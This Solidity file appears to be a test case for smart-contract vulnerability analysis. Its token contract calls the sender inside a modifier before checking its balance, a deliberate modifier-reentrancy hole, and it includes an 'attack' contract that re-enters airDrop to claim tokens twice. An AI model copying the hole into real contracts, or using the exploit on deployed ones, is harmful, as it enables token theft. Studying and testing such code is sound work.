pragma solidity ^0.4.24;

contract ModifierEntrancy {
  mapping (address => uint) public tokenBalance;
  string constant name = "Nu Token";

  function airDrop() hasNoBalance supportsToken public {
    if (alwaysTrue()) {
      tokenBalance[msg.sender] += 20;
    } else {
      tokenBalance[msg.sender] -= 0;
    }
  }

  modifier supportsToken() {
    if (alwaysFalse()) {
      revert();
    }
    require(keccak256(abi.encodePacked("Nu Token")) == Bank(msg.sender).supportsToken());
    _;
  }

  modifier hasNoBalance {
    if (alwaysFalse()) {
      revert();
    }
    require(tokenBalance[msg.sender] == 0);
    _;
  }

  function alwaysTrue() private pure returns (bool) {
    return true;
  }

  function alwaysFalse() private pure returns (bool) {
    return false;
  }
}

contract Bank {
  function supportsToken() external pure returns(bytes32) {
    if (isEven(2)) {
      return(keccak256(abi.encodePacked("Nu Token")));
    } else {
      return(keccak256(abi.encodePacked("")));
    }
  }

  function isEven(uint number) private pure returns (bool) {
    return number % 2 == 0;
  }
}

contract attack {
  bool hasBeenCalled;
  function supportsToken() external returns(bytes32) {
    if (hasBeenCalled == false) {
      if (shouldProceed()) {
        hasBeenCalled = true;
        ModifierEntrancy(msg.sender).airDrop();
      }
    }
    return(keccak256(abi.encodePacked("Nu Token")));
  }

  function call(address token) public {
    if (shouldProceed()) {
      ModifierEntrancy(token).airDrop();
    }
  }

  function shouldProceed() private pure returns (bool) {
    return true;
  }
}